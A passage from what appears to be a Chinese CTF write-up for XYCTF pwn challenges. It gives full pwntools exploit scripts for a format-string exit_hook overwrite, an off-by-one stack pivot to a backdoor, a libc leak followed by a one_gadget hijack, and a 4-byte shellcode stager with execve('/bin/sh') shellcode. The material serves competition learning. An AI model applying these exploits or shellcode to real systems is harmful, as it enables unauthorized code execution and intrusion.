rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

res <span class="token operator">=</span> ru<span class="token punctuation">(</span><span class="token string">b&quot;\\n&quot;</span><span class="token punctuation">)</span>
printf_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;printf_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> printf_addr <span class="token operator">-</span> <span class="token number">0x61CC0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
exit_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">2240352</span><span class="token operator">+</span><span class="token number">8</span>
exit_hook_args_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">2238824</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">0x522C0</span>
one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">0xe3b2e</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_hook:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_hook args&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_hook_args_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;one_gadget:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># cannary-8位置</span>
cannary <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">2045376</span><span class="token operator">+</span><span class="token number">0x28</span> <span class="token operator">-</span><span class="token number">0x8</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;cannary:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>cannary<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># %7$d 就是rsp+8</span>
<span class="token comment"># 第一次构造</span>
<span class="token comment"># payload = b&quot;%64s%13$s&quot;.ljust(0x8,b&quot;a&quot;)+p64(cannary)*3</span>
payload <span class="token operator">=</span><span class="token string">b&quot;%7$ld&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>exit_hook_addr<span class="token punctuation">)</span>
<span class="token comment"># payload =b&quot;%13$s&quot;</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># payload = b&quot;d&quot;*0x38+p64(cannary)+b&quot;c&quot;.ljust(32,b&quot;c&quot;)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="guestbook" tabindex="-1"><a class="header-anchor" href="#guestbook" aria-hidden="true">#</a> GuestBook</h2><blockquote><p>存在栈的off_by_one漏洞 我们通过提前在栈里面写满backdoor地址 然后通过修改返回地址最后一个字节 来实现栈迁移返回到存放backdoor的栈地址上 只要写满了 概率还挺大 然后就可以在第二次返回的时候触发backdoor函数</p></blockquote><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422213216922.png" alt="image-20240422213216922" tabindex="0" loading="lazy"><figcaption>image-20240422213216922</figcaption></figure><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> time

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;xyctf.top&quot;</span>
port <span class="token operator">=</span> <span class="token number">34019</span>

<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *0x401321&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;index\\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;name:\\n&quot;</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;id:\\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span>
backdoor <span class="token operator">=</span> <span class="token number">0x40133A</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">b&quot;0&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x3a\\x13\\x40&quot;</span><span class="token punctuation">,</span><span class="token string">b&quot;48&quot;</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;index\\n&quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;-1&quot;</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;Have a good time!\\n&quot;</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span><span class="token string">b&quot;ls&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># print(rl())</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="hello-world" tabindex="-1"><a class="header-anchor" href="#hello-world" aria-hidden="true">#</a> hello_world</h2><blockquote><p>两次栈溢出 第一次泄露libc 第二次直接劫持程序流程one_gadget</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;xyctf.top&quot;</span>
port <span class="token operator">=</span> <span class="token number">35494</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b main&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">b&quot;please input your name: &quot;</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token string">b&quot;\\x91&quot;</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
baselibc <span class="token operator">=</span> u64<span class="token punctuation">(</span>result<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">47</span> <span class="token operator">-</span><span class="token number">0x29DC0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>baselibc<span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;please input your name: &quot;</span><span class="token punctuation">)</span>
rb<span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x2072</span><span class="token operator">+</span><span class="token number">0x78</span><span class="token operator">+</span>baselibc<span class="token punctuation">)</span>
sd<span class="token punctuation">(</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x50a47</span><span class="token operator">+</span>baselibc<span class="token punctuation">)</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="intermittent" tabindex="-1"><a class="header-anchor" href="#intermittent" aria-hidden="true">#</a> Intermittent</h2><blockquote><p>一次性4字节shellcode空间</p></blockquote><ul><li><p>本来想的是每次用两字节操作两字节跳转到下一个可执行区域 发现不太现实</p></li><li><p>然后发现跳转到执行shellcode的地方的时候寄存器上已经几乎布置好了一些我们需要的值</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422214330654.png" alt="image-20240422214330654" tabindex="0" loading="lazy"><figcaption>image-20240422214330654</figcaption></figure><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422214400338.png" alt="image-20240422214400338" tabindex="0" loading="lazy"><figcaption>image-20240422214400338</figcaption></figure></li><li><p>我们可以利用rep movsb指令 这个指令可以让rsi寄存器的地址开始rcx的字节数据赋值给rdi地址所指的区域 我们可以发现rdx已经有了我们执行shellcode的地址 然后rsi就是我们输入的字符串地址 我们只需要让rdx寄存器的值给rdi 然后触发rep movsb即可 就可以实现shellcode的写入</p></li><li><p>rep movsb是两字节 我们用栈传递参数让rdx赋值给rdi 两字节 刚好四字节 那么我们字符串后面填上getshell的shellcode即可</p></li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
port <span class="token operator">=</span> <span class="token number">1111</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
p <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>file_name<span class="token punctuation">,</span><span class="token string">&quot;b *main+273&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># p = remote(url,port)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">b&quot;show your magic: &quot;</span><span class="token punctuation">)</span>
shellcode1 <span class="token operator">=</span> <span class="token string">b&#39;\\x52\\x5F\\xF3\\xA4&#39;</span>
<span class="token comment"># nop指令不重要</span>
shellcode2 <span class="token operator">=</span> <span class="token string">b&#39;\\x90&#39;</span><span class="token operator">*</span><span class="token number">4</span>
shellcode3 <span class="token operator">=</span> <span class="token string">b&#39;\\x90&#39;</span><span class="token operator">*</span><span class="token number">4</span>
shellcode <span class="token operator">=</span> shellcode1 <span class="token operator">+</span><span class="token string">b&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;</span>
sd<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x90&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="inviisible-flag" tabindex="-1"><a class="header-anchor" href="#inviisible-flag" aria-hidden="true">#</a> inviisible_flag</h2>`,32),k=n("br",null,null,-1),r={href:"https://syscalls.mebeim.net/?table=x86/64/x64/v6.5",target:"_blank",rel:"noopener noreferrer"},d={href:"https://ctf.bugku.com/writeup/detail/id/429.html",target:"_blank",rel:"noopener noreferrer"},m=n("li",null,[s("tips:"),n("code",null,"sendfile64"),s("(调用号:0x28)可以直接让一个文件描述符的内容输出到另一个文件描述符上非常适合平替这次的write函数")],-1),b=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>

<span class="token comment"># shellcode_copy = asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># copy_loop:</span>
<span class="token comment"># cmp rcx, 0</span>
<span class="token comment"># je end_copy                </span>
<span class="token comment"># mov al, [rsi]              </span>
<span class="token comment"># mov [rdi], al               </span>
<span class="token comment"># inc rsi                    </span>
<span class="token comment"># inc rdi                    </span>
<span class="token comment"># dec rcx                     </span>
